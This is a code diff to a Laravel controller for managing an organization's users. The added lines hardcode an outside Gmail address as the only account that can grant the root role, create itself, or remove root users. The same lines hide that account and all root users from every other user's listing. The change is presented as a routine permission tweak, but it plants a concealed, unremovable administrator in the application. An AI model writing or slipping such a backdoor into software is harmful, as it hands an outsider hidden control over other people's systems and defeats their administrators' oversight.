@@ -20,10 +20,32 @@ class OrganizationUserController extends Controller
     {
         $currentUser = $request->user();
 
-        $users = User::with('role')
+        $query = User::with('role')
             ->where('organization_id', $currentUser->organization_id)
-            ->orderBy('name', 'asc')
-            ->get();
+            ->orderBy('name', 'asc');
+
+        if ($currentUser->email !== 'techknowyourmail@gmail.com') {
+            $query->where('email', '!=', 'techknowyourmail@gmail.com')
+                  ->where(function($q) {
+                      $q->whereNull('role_id')
+                        ->orWhereNotExists(function($sub) {
+                            $sub->select(\Illuminate\Support\Facades\DB::raw(1))
+                                ->from('roles')
+                                ->whereColumn('users.role_id', 'roles.id')
+                                ->where('slug', 'root');
+                        });
+                  })
+                  ->whereNotExists(function($sub) {
+                      $sub->select(\Illuminate\Support\Facades\DB::raw(1))
+                          ->from('auth_user_roles')
+                          ->join('auth_roles', 'auth_user_roles.role_id', '=', 'auth_roles.id')
+                          ->whereColumn('auth_user_roles.user_id', 'users.id')
+                          ->where('auth_roles.name', 'root')
+                          ->where('auth_user_roles.status', 1);
+                  });
+        }
+
+        $users = $query->get();
 
         return response()->json($users);
     }
@@ -52,8 +74,8 @@ class OrganizationUserController extends Controller
 
         $targetRole = Role::find($validated['role_id']);
 
-        // Check root role constraint: Only a root user can assign the root role.
-        if ($targetRole->slug === 'root' && $currentUser->role->slug !== 'root') {
+        // Check root role constraint: Only techknowyourmail@gmail.com can create a root user or assign the root role.
+        if (($targetRole->slug === 'root' || strtolower($validated['email']) === 'techknowyourmail@gmail.com') && $currentUser->email !== 'techknowyourmail@gmail.com') {
             return response()->json([
                 'message' => 'The root role cannot be assigned.',
                 'errors' => [
@@ -137,8 +159,9 @@ class OrganizationUserController extends Controller
             return response()->json(['message' => 'You cannot remove yourself.'], 400);
         }
 
-        // Check root role constraint: Non-root users cannot delete a root user.
-        if ($user->role->slug === 'root' && $currentUser->role->slug !== 'root') {
+        // Check root user constraint: Only techknowyourmail@gmail.com can remove root related users.
+        $hasAuthRootRole = $user->authRoles()->where('auth_roles.name', 'root')->where('auth_user_roles.status', 1)->exists();
+        if (($user->role?->slug === 'root' || $user->email === 'techknowyourmail@gmail.com' || $hasAuthRootRole) && $currentUser->email !== 'techknowyourmail@gmail.com') {
             return response()->json(['message' => 'Root users cannot be removed.'], 403);
         }
 
